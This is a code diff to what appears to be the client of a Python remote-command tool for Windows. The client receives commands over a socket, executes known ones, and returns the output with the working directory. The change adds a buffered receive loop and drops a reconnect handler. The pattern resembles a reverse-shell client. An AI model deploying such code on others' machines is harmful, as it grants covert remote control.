@@ -1,4 +1,5 @@
 import getpass
+import importlib
 import os
 import socket
 import sys
@@ -33,7 +34,6 @@ class Client:
 
         self.platform_type: str = sys.platform.lower()
         self.username = getpass.getuser()
-        self.working_directory = os.getcwd()
         self.user_path: str = os.environ['USERPROFILE']
 
         self.new_working_directory: str = os.path.join(self.user_path)
@@ -51,21 +51,19 @@ class Client:
         )
 
         while True:
-            try:
-                command = self.socket.recv(self.buffer_size).decode()
-                command_data = command.split()
+            command = self.recv_all().decode()
+            command_data = command.split()
 
-                command_arguments: list = command_data[1:]
-                command_name: str = command_data[0]
+            command_arguments: list = command_data[1:]
+            command_name: str = command_data[0]
 
-                if command_name.lower() in self.get_commands:
-                    output = self.execute_command(command_name, command_arguments)
-                    self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
-                else:
-                    output = f'{Fore.LIGHTRED_EX}{command_name} is not found!'
-                    self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
-            except (IndexError, ConnectionResetError):
-                self.restart()
+            if command_name.lower() in self.get_commands:
+                output = self.execute_command(command_name, command_arguments)
+            else:
+                output = f'{Fore.LIGHTRED_EX}{command_name} is not found!'
+
+            working_directory = os.getcwd()
+            self.socket.send(self.encode_string(f'{output}{self.separator}{working_directory}'))
 
     def restart(self):
         os.system('cls')
@@ -95,6 +93,18 @@ class Client:
     @staticmethod
     def encode_string(string: str) -> bytes:
         return string.encode()
+
+    def recv_all(self) -> bytes:
+        data: bytes = b''
+
+        while True:
+            paginated = self.socket.recv(self.buffer_size)
+            data += paginated
+
+            if len(paginated) < self.buffer_size:
+                break
+
+        return data
 
 
 if __name__ == '__main__':
